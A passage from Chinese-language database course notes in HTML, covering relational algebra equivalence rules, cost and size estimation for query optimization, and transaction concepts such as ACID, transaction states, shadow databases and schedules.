<p>先投影再连接，和先连接再投影，结果是一样的。</p>
</div>
<div class="tabbed-block">
<p>投影操作的分配律,考虑以下条件</p>
<ul>
<li><span class="arithmatex">\(L_1\)</span> 和 <span class="arithmatex">\(L_2\)</span> 是 <span class="arithmatex">\(R\)</span> 和 <span class="arithmatex">\(S\)</span> 的属性</li>
<li><span class="arithmatex">\(L_{1a}\)</span> 是 <span class="arithmatex">\(R\)</span> 的属性,在<span class="arithmatex">\(\theta\)</span>中,但不在 <span class="arithmatex">\(L_1 \cup L_2\)</span> 中</li>
<li><span class="arithmatex">\(L_{1b}\)</span> 是 <span class="arithmatex">\(S\)</span> 的属性,在<span class="arithmatex">\(\theta\)</span>中,但不在 <span class="arithmatex">\(L_1 \cup L_2\)</span> 中</li>
</ul>
<div class="arithmatex">\[
    \Pi_{L_1 \cup L_2}(R \bowtie_{\theta} S) = \Pi_{L_{1a} \cup L_1}(R) \bowtie_{\theta} \Pi_{L_{1b} \cup L_2}(S)
\]</div>
<p>先将参与连接的属性投影出来，再进行连接，最后再提取需要的属性。结果和先连接再投影是一样的。</p>
</div>
<div class="tabbed-block">
<p>集合的交和并操作可交换</p>
<div class="arithmatex">\[
    R \cup S = S \cup R
\]</div>
<div class="arithmatex">\[
    R \cap S = S \cap R
\]</div>
</div>
<div class="tabbed-block">
<p>集合的交和并操作可结合</p>
<div class="arithmatex">\[
    (R \cup S) \cup T = R \cup (S \cup T)
\]</div>
<div class="arithmatex">\[
    (R \cap S) \cap T = R \cap (S \cap T)
\]</div>
</div>
<div class="tabbed-block">
<p>选择操作可在集合运算上分配，如果<span class="arithmatex">\(F\)</span>包含<span class="arithmatex">\(R\)</span>和<span class="arithmatex">\(S\)</span>的元组</p>
<div class="arithmatex">\[
    \sigma_F(R \cup S) = \sigma_F(R) \cup \sigma_F(S)
\]</div>
<p>对于 <span class="arithmatex">\(\cap\)</span> 和 <span class="arithmatex">\(\setminus\)</span> 也成立</p>
<p>如果<span class="arithmatex">\(F\)</span>只包含<span class="arithmatex">\(R\)</span>的元组，则</p>
<div class="arithmatex">\[
    \sigma_F(R \cap S) = \sigma_F(R) \cap \sigma_F(S)
\]</div>
<p>对于 <span class="arithmatex">\(\setminus\)</span> 也成立，但是对于 <span class="arithmatex">\(\cup\)</span> 不成立</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>E1 = {a, b}，E2 = {c, d}，<span class="arithmatex">\(\theta\)</span>: 只保留a</p>
<div class="arithmatex">\[
    \sigma_{\theta}(E1 \cup E2) = \sigma_{\theta}({a, b, c, d}) = {a}
\]</div>
<div class="arithmatex">\[
    \sigma_{\theta}(E1) \cup E2 = {a} \cup {c, d} = {a, c, d}
\]</div>
<p>结果不同</p>
</div>
</div>
<div class="tabbed-block">
<p>投影操作可分配</p>
<div class="arithmatex">\[
    \Pi_{L_1}(R \cup S) = \Pi_{L_1}(R) \cup \Pi_{L_1}(S)
\]</div>
</div>
</div>
</div>
</div>
<h2 id="note-db-optimization-statistics-for-cost-estimation">Statistics for Cost Estimation<a class="headerlink" href="#note-db-optimization-statistics-for-cost-estimation" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">统计信息</p>
<ul>
<li><span class="arithmatex">\(n_r\)</span>: 关系 <span class="arithmatex">\(r\)</span> 中的元组数量</li>
<li><span class="arithmatex">\(b_r\)</span>: 包含关系 <span class="arithmatex">\(r\)</span> 元组的块数量</li>
<li><span class="arithmatex">\(l_r\)</span>: 关系 <span class="arithmatex">\(r\)</span> 中一个元组的大小</li>
<li><span class="arithmatex">\(f_r\)</span>: 关系 <span class="arithmatex">\(r\)</span> 的阻塞因子 — 即一个块中能容纳的 <span class="arithmatex">\(r\)</span> 的元组数量 tuples per block</li>
<li><span class="arithmatex">\(V(A, r)\)</span>: 在关系 <span class="arithmatex">\(r\)</span> 的属性 <span class="arithmatex">\(A\)</span> 上出现的不同值的数量；等同于 <span class="arithmatex">\(\Pi_A(r)\)</span> 的大小</li>
<li>
<p>如果关系 <span class="arithmatex">\(r\)</span> 的元组在物理上存储在一个文件中，则：</p>
<div class="arithmatex">\[
   b_r = \lceil \frac{n_r}{f_r} \rceil
\]</div>
</li>
</ul>
</div>
<h3 id="note-db-optimization-histograms">Histograms<a class="headerlink" href="#note-db-optimization-histograms" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/hist.png" width="500" />

<figcaption>eg,Histogram on attribute age of relation person</figcaption>
</figure>
<h4 id="note-db-optimization-equi-width-histograms">Equi-width histograms<a class="headerlink" href="#note-db-optimization-equi-width-histograms" title="Permanent link">&para;</a></h4>
<p>等宽直方图将值域划分为相同宽度的区间。每个区间的宽度相同，但每个区间内的元组数量可能差异很大。</p>
<p>特点：</p>
<ul>
<li>所有区间的宽度相同</li>
<li>实现简单</li>
<li>对于数据分布不均匀的情况，可能导致某些区间元组数过多，某些区间元组数过少</li>
<li>容易受到极端值的影响</li>
</ul>
<h4 id="note-db-optimization-equi-depth-histograms">Equi-depth histograms<a class="headerlink" href="#note-db-optimization-equi-depth-histograms" title="Permanent link">&para;</a></h4>
<p>等深直方图将数据划分为包含相同元组数量的区间。每个区间包含大致相同数量的元组，但区间宽度可能不同。</p>
<p>特点：</p>
<ul>
<li>所有区间包含大致相同数量的元组</li>
<li>对于偏斜数据分布有更好的适应性</li>
<li>提供更准确的选择率估计</li>
<li>计算成本比等宽直方图高</li>
<li>在数据更新时可能需要重新计算区间边界</li>
</ul>
<h3 id="note-db-optimization-selection-size-estimation">Selection Size Estimation<a class="headerlink" href="#note-db-optimization-selection-size-estimation" title="Permanent link">&para;</a></h3>
<p>选择操作的大小估计是查询优化中的关键步骤，它帮助优化器评估不同执行计划的成本。</p>
<h4 id="note-db-optimization-sigma_avr"><span class="arithmatex">\(\sigma_{A=v}(r)\)</span><a class="headerlink" href="#note-db-optimization-sigma_avr" title="Permanent link">&para;</a></h4>
<p>对于等值选择操作 <span class="arithmatex">\(\sigma_{A=v}(r)\)</span>，其结果大小估计为：</p>
<ul>
<li>如果 <span class="arithmatex">\(A\)</span> 是 <span class="arithmatex">\(r\)</span> 的主键：结果大小为 1 或 0</li>
<li>如果 <span class="arithmatex">\(A\)</span> 不是主键：结果大小约为 <span class="arithmatex">\(\frac{n_r}{V(A,r)}\)</span>，假设每种值的个数一样来估计，即其均匀分布在<span class="arithmatex">\(V(A,r)\)</span>个值中，v值的概率为<span class="arithmatex">\(\frac{1}{V(A,r)}\)</span>，所以结果大小为<span class="arithmatex">\(n_r \times \frac{1}{V(A,r)}\)</span></li>
</ul>
<h4 id="note-db-optimization-sigma_a-leq-vr"><span class="arithmatex">\(\sigma_{A \leq v}(r)\)</span><a class="headerlink" href="#note-db-optimization-sigma_a-leq-vr" title="Permanent link">&para;</a></h4>
<p>对于范围选择操作 <span class="arithmatex">\(\sigma_{A \leq v}(r)\)</span>，如果没有可用的直方图信息：</p>
<ul>
<li>假设值均匀分布，结果大小估计为：<span class="arithmatex">\(n_r \cdot \frac{v - \min(A,r)}{\max(A,r) - \min(A,r)}\)</span></li>
<li>
<p>其中 <span class="arithmatex">\(\min(A,r)\)</span> 和 <span class="arithmatex">\(\max(A,r)\)</span> 分别是属性 <span class="arithmatex">\(A\)</span> 在关系 <span class="arithmatex">\(r\)</span> 中的最小值和最大值，这种估计方法采用了区间比例的方式</p>
</li>
<li>
<p>如果信息不够，则使用默认估计：<span class="arithmatex">\(\frac{n_r}{2}\)</span></p>
</li>
</ul>
<h3 id="note-db-optimization-complex-selection-conditions">Complex Selection Conditions<a class="headerlink" href="#note-db-optimization-complex-selection-conditions" title="Permanent link">&para;</a></h3>
<p>对于复杂的选择条件，我们需要估计多个条件组合的选择率。</p>
<h4 id="note-db-optimization-selectivity">Selectivity<a class="headerlink" href="#note-db-optimization-selectivity" title="Permanent link">&para;</a></h4>
<p>Selectivity of <span class="arithmatex">\(\theta\)</span> is the probability that a tuple in <span class="arithmatex">\(r\)</span> satisfies <span class="arithmatex">\(\theta\)</span>.</p>
<ul>
<li>If <span class="arithmatex">\(s_r\)</span> is the number of tuples in <span class="arithmatex">\(r\)</span> that satisfy <span class="arithmatex">\(\theta\)</span>, then the selectivity is <span class="arithmatex">\(\frac{s_r}{n_r}\)</span></li>
</ul>
<h4 id="note-db-optimization-estimation-of-selectivity-for-complex-conditions">Estimation of Selectivity for Complex Conditions<a class="headerlink" href="#note-db-optimization-estimation-of-selectivity-for-complex-conditions" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>合取条件（Conjunction）</strong>：<span class="arithmatex">\(\sigma_{\theta_1 \land \theta_2 \land ... \land \theta_n}(r)\)</span></li>
</ul>
<p>假设条件之间相互独立，估计结果元组数为：</p>
<div class="arithmatex">\[
    n_r \times \frac{s_1 \times s_2 \times ... \times s_n}{n_r^n}
\]</div>
<p>其中 <span class="arithmatex">\(s_i\)</span> 是满足条件 <span class="arithmatex">\(\theta_i\)</span> 的元组数。</p>
<ul>
<li><strong>析取条件（Disjunction）</strong>：<span class="arithmatex">\(\sigma_{\theta_1 \lor \theta_2 \lor ... \lor \theta_n}(r)\)</span></li>
</ul>
<p>估计结果元组数为：</p>
<div class="arithmatex">\[
    n_r \times \left(1-(1-\frac{s_1}{n_r}) \times (1-\frac{s_2}{n_r}) \times ... \times (1-\frac{s_n}{n_r})\right)
\]</div>
<p>即选择率为1减去一个都没选到的概率</p>
<ul>
<li><strong>否定条件（Negation）</strong>：<span class="arithmatex">\(\sigma_{\lnot\theta}(r)\)</span></li>
</ul>
<p>估计结果元组数为：</p>
<div class="arithmatex">\[
    n_r - size(\sigma_\theta(r))
\]</div>
<div class="admonition note">
<p class="admonition-title">独立性假设的局限</p>
<p>在实际数据中，属性之间通常存在相关性，独立性假设可能导致估计不准确。一些数据库系统会维护多列统计信息来处理这种情况。</p>
</div>
<h3 id="note-db-optimization-estimation-of-the-size-of-joins">Estimation of the Size of Joins<a class="headerlink" href="#note-db-optimization-estimation-of-the-size-of-joins" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>笛卡尔积</strong><br />
<span class="arithmatex">\(r \times s\)</span> 包含 <span class="arithmatex">\(n_r \cdot n_s\)</span> 个元组，每个元组大小为 <span class="arithmatex">\(s_r + s_s\)</span> 字节。</p>
</li>
<li>
<p><strong>无交集的连接</strong>  </p>
</li>
</ul>
<p>如果 <span class="arithmatex">\(R \cap S = \emptyset\)</span>，则 <span class="arithmatex">\(r \Join s\)</span> 等价于 <span class="arithmatex">\(r \times s\)</span>。</p>
<ul>
<li><strong>连接属性为主键</strong>  </li>
</ul>
<p>如果 <span class="arithmatex">\(R \cap S\)</span> 是 <span class="arithmatex">\(R\)</span> 的主键，则 <span class="arithmatex">\(s\)</span> 中的每个元组至多与 <span class="arithmatex">\(r\)</span> 中一个元组连接，<br />
所以 <span class="arithmatex">\(r \Join s\)</span> 的元组数不超过 <span class="arithmatex">\(s\)</span> 的元组数。</p>
<ul>
<li><strong>连接属性为外键</strong>  </li>
</ul>
<p>如果 <span class="arithmatex">\(R \cap S\)</span> 在 <span class="arithmatex">\(S\)</span> 中是外键，引用 <span class="arithmatex">\(R\)</span> 的主键，则 <span class="arithmatex">\(r \Join s\)</span> 的元组数等于 <span class="arithmatex">\(s\)</span> 的元组数。  </p>
<p>反过来，如果 <span class="arithmatex">\(R \cap S\)</span> 在 <span class="arithmatex">\(R\)</span> 中是外键，引用 <span class="arithmatex">\(S\)</span> 的主键，则结果等于 <span class="arithmatex">\(r\)</span> 的元组数。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>查询 <code>student \Join takes</code>，其中 <code>takes</code> 表的 <code>ID</code> 是外键，引用 <code>student</code> 的主键。<br />
因此结果正好有 <span class="arithmatex">\(n_{takes}\)</span> 个元组。</p>
</div>
<ul>
<li>如果 <span class="arithmatex">\(R \cap S = \{A\}\)</span> 不是 <span class="arithmatex">\(R\)</span> 或 <span class="arithmatex">\(S\)</span> 的主键，<br />
  假设 <span class="arithmatex">\(R\)</span> 中每个元组都能和 <span class="arithmatex">\(S\)</span> 中 <span class="arithmatex">\(A\)</span> 值相等的元组连接，<br />
  则 <span class="arithmatex">\(r \Join s\)</span> 的元组数估计为：</li>
</ul>
<div class="arithmatex">\[
    \frac{n_r \cdot n_s}{V(A, s)}
\]</div>
<p>即<span class="arithmatex">\(S\)</span>中A每一种值大概有<span class="arithmatex">\(n_s/V(A, s)\)</span>个元组，<span class="arithmatex">\(R\)</span>中每个关系来匹配这些元组，所以结果为<span class="arithmatex">\(n_r \cdot n_s/V(A, s)\)</span></p>
<ul>
<li>如果反过来（<span class="arithmatex">\(A\)</span> 在 <span class="arithmatex">\(R\)</span> 中的不同值更少），则估计为：</li>
</ul>
<div class="arithmatex">\[
    \frac{n_r \cdot n_s}{V(A, r)}
\]</div>
<ul>
<li>取这两个估计值中**较小的那个**，通常更准确。</li>
</ul>
<p>如果有直方图，则可以对每个区间分别用类似公式估计，然后加总，得到更准确的结果。</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>让我们看一个具体的例子：</p>
<ul>
<li><code>student</code> 表有 5000 条记录，每个块存储 50 条记录，共需要 100 个块</li>
<li><code>takes</code> 表有 10000 条记录，每个块存储 25 条记录，共需要 400 个块</li>
<li><code>ID</code> 在 <code>takes</code> 表中有 2500 个不同值，意味着平均每个学生选修了 4 门课程</li>
<li><code>ID</code> 在 <code>student</code> 表中有 5000 个不同值（是主键）</li>
<li>
<p><code>takes</code> 表中的 <code>ID</code> 是引用 <code>student</code> 表的外键
假设我们要计算 <code>student ⋈ takes</code> 的大小估计，但不使用外键信息：</p>
</li>
<li>
<p>假设 <code>V(ID, takes) = 2500</code>，<code>V(ID, student) = 5000</code></p>
</li>
<li>两种估计方式：</li>
<li><span class="arithmatex">\(\frac{n_{student} \cdot n_{takes}}{V(ID, takes)} = \frac{5000 \cdot 10000}{2500} = 20000\)</span></li>
<li><span class="arithmatex">\(\frac{n_{student} \cdot n_{takes}}{V(ID, student)} = \frac{5000 \cdot 10000}{5000} = 10000\)</span></li>
<li>我们选择较小的估计值 10000，这与使用外键信息得到的结果相同</li>
</ul>
</div>
<h2 id="note-db-optimization-size-estimation-for-other-operations">Size Estimation for other operations<a class="headerlink" href="#note-db-optimization-size-estimation-for-other-operations" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p><strong>投影操作</strong>：<span class="arithmatex">\(\Pi_A(r)\)</span> 的估计大小为 <span class="arithmatex">\(V(A, r)\)</span></p>
<ul>
<li>因为投影操作会去除重复元组，结果大小取决于属性的不同值数量</li>
</ul>
</li>
<li>
<p><strong>聚合操作</strong>：<span class="arithmatex">\(_{A}G_F(r)\)</span> 的估计大小为 <span class="arithmatex">\(V(A, r)\)</span></p>
<ul>
<li>因为按 A 分组后，每个不同的 A 值对应一个结果元组</li>
</ul>
</li>
<li>
<p><strong>外连接操作</strong>：</p>
<ul>
<li>左外连接：<span class="arithmatex">\(r\)</span> leftouterjoin <span class="arithmatex">\(s\)</span> 的估计大小为 <span class="arithmatex">\(r \bowtie s\)</span> 的大小加上 <span class="arithmatex">\(r\)</span> 中不能连接的元组数量，即 <span class="arithmatex">\(size(r \bowtie s) + size(r)\)</span></li>
<li>右外连接：<span class="arithmatex">\(r\)</span> rightouterjoin <span class="arithmatex">\(s\)</span> 的估计大小为 <span class="arithmatex">\(r \bowtie s\)</span> 的大小加上 <span class="arithmatex">\(s\)</span> 中不能连接的元组数量，即 <span class="arithmatex">\(size(r \bowtie s) + size(s)\)</span></li>
<li>全外连接：<span class="arithmatex">\(r\)</span> fullouterjoin <span class="arithmatex">\(s\)</span> 的估计大小为 <span class="arithmatex">\(size(r \bowtie s) + size(r) + size(s)\)</span></li>
</ul>
</li>
<li>
<p><strong>集合操作</strong>：</p>
<ul>
<li>对于同一关系上的选择条件的并/交集：可以重写为单个选择然后使用选择大小估计<ul>
<li>例如，<span class="arithmatex">\(\sigma_{\theta_1 \lor \theta_2}(r)\)</span> 可重写为 <span class="arithmatex">\(\sigma_{\theta_1}(r) \cup \sigma_{\theta_2}(r)\)</span></li>
</ul>
</li>
<li>对于不同关系上的操作：<ul>
<li><span class="arithmatex">\(r \cup s\)</span> 的估计大小为 <span class="arithmatex">\(size(r) + size(s)\)</span>（上界估计）</li>
<li><span class="arithmatex">\(r \cap s\)</span> 的估计大小为 <span class="arithmatex">\(min(size(r), size(s))\)</span>（上界估计）</li>
<li><span class="arithmatex">\(r - s\)</span> 的估计大小为 <span class="arithmatex">\(size(r)\)</span>（上界估计）</li>
</ul>
</li>
<li>所有这些估计可能不太准确，但提供了操作结果大小的上界</li>
</ul>
</li>
</ul>
<h2 id="note-db-optimization-estimation-of-number-of-distinct-values">Estimation of Number of Distinct Values）<a class="headerlink" href="#note-db-optimization-estimation-of-number-of-distinct-values" title="Permanent link">&para;</a></h2>
<h3 id="note-db-optimization-selection">Selection<a class="headerlink" href="#note-db-optimization-selection" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>等值选择</strong>：<span class="arithmatex">\(\sigma_{A=v}(r)\)</span></p>
<ul>
<li>如果选择条件强制 A 取特定值（如 A=3），则 <span class="arithmatex">\(V(A, \sigma_{A=v}(r)) = 1\)</span></li>
</ul>
</li>
<li>
<p><strong>值集合选择</strong>：<span class="arithmatex">\(\sigma_{A \in \{v_1, v_2, ..., v_n\}}(r)\)</span></p>
<ul>
<li>如果选择条件强制 A 取特定值集合中的值，则 <span class="arithmatex">\(V(A, \sigma_{A \in \{...\}}(r)) = n\)</span>（集合中值的数量）</li>
<li>例如，<span class="arithmatex">\(\sigma_{A=1 \lor A=3 \lor A=4}(r)\)</span> 中 <span class="arithmatex">\(V(A) = 3\)</span></li>
</ul>
</li>
<li>
<p><strong>范围选择</strong>：<span class="arithmatex">\(\sigma_{A \, op \, v}(r)\)</span>（其中op是比较操作符）</p>
<ul>
<li>估计 <span class="arithmatex">\(V(A, \sigma_{A \, op \, v}(r)) = V(A, r) \times s\)</span></li>
<li>其中 <span class="arithmatex">\(s\)</span> 是选择的选择率（selectivity）</li>
</ul>
</li>
<li>
<p><strong>其他情况</strong>：</p>
<ul>
<li>使用近似估计：<span class="arithmatex">\(min(V(A, r), n_{\sigma_\theta(r)})\)</span></li>
<li>即取属性在原关系中的不同值数量和选择结果大小中的较小值</li>
</ul>
</li>
</ol>
<h3 id="note-db-optimization-join">Join<a class="headerlink" href="#note-db-optimization-join" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>属性全部来自一个关系</strong>：</p>
<ul>
<li>如果 A 的所有属性都来自于关系 <span class="arithmatex">\(r\)</span>，则 <span class="arithmatex">\(V(A, r \bowtie s) = min(V(A, r), n_{r \bowtie s})\)</span></li>
<li>也就是说，不会超过原关系中的不同值数量和连接结果大小</li>
</ul>
</li>
<li>
<p><strong>属性来自多个关系</strong>：</p>
<ul>
<li>如果 A 包含来自 <span class="arithmatex">\(r\)</span> 的属性 A1 和来自 <span class="arithmatex">\(s\)</span> 的属性 A2，则：</li>
<li><span class="arithmatex">\(V(A, r \bowtie s) = min(V(A1, r) \times V(A2, s), V(A1-A2, r) \times V(A2, s), V(A1, r) \times V(A2-A1, s), n_{r \bowtie s})\)</span></li>
</ul>
</li>
</ol>
<div class="admonition note">
<p class="admonition-title">公式解释</p>
<p><strong><span class="arithmatex">\(V(A1, r) \times V(A2, s)\)</span></strong>：</p>
<ul>
<li>假设A1和A2中的值完全独立</li>
<li>例如：如果A1有10个不同值，A2有5个不同值，最多可能有10×5=50个不同组合</li>
</ul>
<p><strong><span class="arithmatex">\(V(A1-A2, r) \times V(A2, s)\)</span></strong>：</p>
<ul>
<li>A1-A2表示A1中不在A2中的属性</li>
<li>考虑了A1和A2可能有重叠属性的情况</li>
<li>只计算A1中独有属性与A2所有属性的组合</li>
</ul>
<p><strong><span class="arithmatex">\(V(A1, r) \times V(A2-A1, s)\)</span></strong>：</p>
<ul>
<li>A2-A1表示A2中不在A1中的属性</li>
<li>与前一项类似，但从另一个角度考虑</li>
<li>计算A1所有属性与A2中独有属性的组合</li>
</ul>
<p><strong><span class="arithmatex">\(n_{r \bowtie s}\)</span></strong>：</p>
<ul>
<li>连接结果的总元组数</li>
<li>这是一个上界，因为不同值数量不能超过元组总数</li>
</ul>
</div>
<h3 id="note-db-optimization-other">Other<a class="headerlink" href="#note-db-optimization-other" title="Permanent link">&para;</a></h3>
<ol>
<li>
<p><strong>投影操作</strong>：</p>
<ul>
<li><span class="arithmatex">\(V(A, \Pi_{A}(r)) = V(A, r)\)</span></li>
<li>投影不会改变属性的不同值数量</li>
</ul>
</li>
<li>
<p><strong>分组聚合操作</strong>：</p>
<ul>
<li>对于分组属性，不同值数量不变</li>
<li>对于聚合值：<ul>
<li>对于 MIN/MAX 函数，不同值数量估计为 <span class="arithmatex">\(min(V(A, r), V(G, r))\)</span>，其中 G 是分组属性</li>
<li>对于其他聚合（SUM, AVG, COUNT等），假设所有结果值都不同，使用 <span class="arithmatex">\(V(G, r)\)</span></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>这些估计方法提供了查询优化器所需的基本统计信息，虽然有时可能不够准确，但在实际应用中通常足够指导查询优化器选择合理的执行计划。</p>
<h2 id="note-db-optimization-choice-of-evaluation-plans">Choice of Evaluation Plans<a class="headerlink" href="#note-db-optimization-choice-of-evaluation-plans" title="Permanent link">&para;</a></h2>
<p>在查询优化中，选择合适的查询评估计划是关键步骤。这不仅涉及各个操作的执行成本估计，还需要考虑操作之间的交互关系。</p>
<ul>
<li>
<p><strong>单独优化的陷阱</strong>：为每个操作独立选择最便宜的算法，可能不会产生全局最优的查询计划</p>
</li>
<li>
<p><strong>考虑交互作用的例子</strong>：</p>
<ul>
<li>Merge-join可能比Hash-join成本高，但它能提供已排序的输出，可能减少上层聚合操作的成本</li>
<li>Nested-loop join可能提供流水线执行(pipelining)的机会，减少中间结果的物化成本</li>
</ul>
</li>
</ul>
<p>实际的查询优化器通常结合以下两种方法：</p>
<ol>
<li>
<p><strong>基于成本的搜索</strong>：</p>
<ul>
<li>搜索所有可能的计划，基于成本模型选择最佳计划</li>
<li>全面但计算开销大</li>
</ul>
</li>
<li>
<p><strong>基于启发式的选择</strong>：</p>
<ul>
<li>使用启发式规则快速缩小搜索空间</li>
<li>速度快但可能错过全局最优解</li>
</ul>
</li>
</ol>
<h2 id="note-db-optimization-cost-based-optimization">Cost-Based Optimization<a class="headerlink" href="#note-db-optimization-cost-based-optimization" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p><strong>连接操作数量增长</strong>：对于n个关系的连接 <span class="arithmatex">\(r_1 \bowtie r_2 \bowtie \ldots \bowtie r_n\)</span></p>
<ul>
<li>不同连接顺序的数量为 <span class="arithmatex">\((2(n-1))!/(n-1)!\)</span></li>
<li>当n=7时，有665,280种不同顺序</li>
<li>当n=10时，超过1760亿种顺序</li>
</ul>
</li>
<li>
<p><strong>动态规划解决方案</strong>：</p>
<ul>
<li>不需要生成所有可能的连接顺序</li>
<li>使用动态规划，任何子集 <span class="arithmatex">\(\{r_1, r_2, \ldots, r_m\}\)</span> 的最佳连接顺序只需计算一次</li>
<li>结果存储起来供后续使用，显著减少计算量</li>
</ul>
</li>
</ul></section><section class="print-page" id="note-db-transaction" heading-number="2.2.1.11"><h1 id="note-db-transaction-transaction">Transaction<a class="headerlink" href="#note-db-transaction-transaction" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3190 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 12 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<div class="admonition definition">
<p class="admonition-title">Transaction</p>
<p>A  transaction is a unit of program execution that accesses and possibly updates various data items. To preserve the integrity of data, the database system must ensure:</p>
<p>ACID properties:</p>
<ul>
<li><strong>Atomicity</strong> : 原子性，一个事务，要么全部执行，要么全部不执行。</li>
<li><strong>Consistency</strong> : 一致性，事务执行前后，数据库的状态必须满足一致性约束。</li>
<li><strong>Isolation</strong> : 隔离性，一个事务的执行，不受其他事务的干扰。对于任意一对事务<span class="arithmatex">\(T_i\)</span>和<span class="arithmatex">\(T_j\)</span>,要么<span class="arithmatex">\(T_i\)</span>在<span class="arithmatex">\(T_j\)</span>之前执行，要么<span class="arithmatex">\(T_i\)</span>在<span class="arithmatex">\(T_j\)</span>之后执行。</li>
<li><strong>Durability</strong> : 持久性，一个事务一旦提交，其结果必须永久保存，即使系统崩溃，也不会丢失。</li>
</ul>
</div>
<h2 id="note-db-transaction-transaction-state">Transaction State<a class="headerlink" href="#note-db-transaction-transaction-state" title="Permanent link">&para;</a></h2>
<p>事务有以下四个阶段</p>
<ul>
<li><strong>Active</strong> : 事务正在执行。</li>
<li><strong>Partially Committed</strong> : 事务的最后一个操作已经执行，等待提交，此时要输出的结果数据可能还在内存buffer中。</li>
<li><strong>Failed</strong> : 事务执行失败。</li>
<li><strong>Aborted</strong> : 事务被撤销，数据库恢复到事务开始前的状态。事务被中止后有两个选择：<ul>
<li>重启事务：只有在没有内部逻辑错误的情况下才能进行</li>
<li>终止事务：彻底放弃事务的执行</li>
</ul>
</li>
<li><strong>Committed</strong> : 事务执行成功。</li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/transaction_state.png" width="500" />

<figcaption>Transaction State</figcaption>
</figure>
<h2 id="note-db-transaction-implementation-of-a-d">Implementation of A &amp; D<a class="headerlink" href="#note-db-transaction-implementation-of-a-d" title="Permanent link">&para;</a></h2>
<p>数据库系统的恢复管理组件(Recovery Manager, RM)实现了对原子性（Atomicity）和持久性（Durability）的支持。</p>
<h3 id="note-db-transaction-shadow-database-scheme">Shadow-Database Scheme<a class="headerlink" href="#note-db-transaction-shadow-database-scheme" title="Permanent link">&para;</a></h3>
<p>这是一种简单但效率不高的方案：</p>
<ul>
<li>一个名为 <code>db_pointer</code> 的指针始终指向当前一致的数据库副本</li>
<li>所有更新都在新创建的数据库副本上进行</li>
<li>原始副本（即影子副本）保持不变，由 <code>db_pointer</code> 指向</li>
</ul>
<p><strong>如果事务中止（Abort）</strong>：</p>
<ul>
<li>只需删除新副本即可</li>
</ul>
<p><strong>如果事务提交（Commit）</strong>：</p>
<ol>
<li>将新副本的所有内存页面写入磁盘（在Unix系统中，使用flush命令）</li>
<li>将 <code>db_pointer</code> 更改为指向新副本，使其成为当前副本</li>
<li>同时删除旧副本</li>
</ol>
<p>这种方法确保了即使在系统崩溃的情况下，数据库也能保持一致状态，从而实现了原子性和持久性。</p>
<figure>
<img alt="" src="../NOTE/DB/img/shallow_database.png" width="500" />
<img alt="" src="../NOTE/DB/img/shallow_database_commit.png" width="500" />
</figure>
<p>这种方法需要<code>db_pointer</code>的原子性，并且不能有并发，磁盘也不能fail；对于text editor，这种方案很常用，但是对于大型的数据库系统，这种方法的效率很低。</p>
<h2 id="note-db-transaction-concurrent-executions">Concurrent Executions<a class="headerlink" href="#note-db-transaction-concurrent-executions" title="Permanent link">&para;</a></h2>
<p>数据库系统允许多个事务并发运行。并发执行的优势包括：</p>
<ul>
<li><strong>提高处理器和磁盘利用率，增加事务吞吐量</strong>：一个事务可以使用CPU，而另一个事务同时进行磁盘读写操作。</li>
<li><strong>减少事务的平均响应时间</strong>：短事务不需要在长事务后面等待。</li>
</ul>
<p><strong>问题</strong>：尽管每个单独的事务都是正确的，但并发可能会破坏一致性（如并发售票问题）。</p>
<p><strong>并发控制方案</strong> - 实现隔离性的机制，即控制并发事务之间的交互，防止它们破坏数据库的一致性。
- 这是DBMS的重要工作</p>
<div class="admonition definition">
<p class="admonition-title">Schedules</p>
<p>调度（Schedules）是指示并发事务的指令按照时间顺序执行的序列。</p>
<p>对于一组事务的调度必须包含所有事务的所有指令。</p>
<p>调度必须保持每个单独事务中指令出现的顺序。</p>
</div>
<figure>
<img alt="" src="../NOTE/DB/img/schedule.png" width="500" />

<figcaption>Serial Schedule</figcaption>
</figure>
<p>一些看起来不是串行调度和某些串行调度是等价的，一些就不行</p>
<figure>
<img alt="" src="../NOTE/DB/img/schedule1.png" width="500" />

<figcaption>Schedule Equivalence</figcaption>
</figure>
<p>在这里，schedule4就不是串行等价的,使用这种调度执行两个事务之后，A+B的结果发生了改变；</p>
<h2 id="note-db-transaction-serializability">Serializability<a class="headerlink" href="#note-db-transaction-serializability" title="Permanent link">&para;</a></h2>
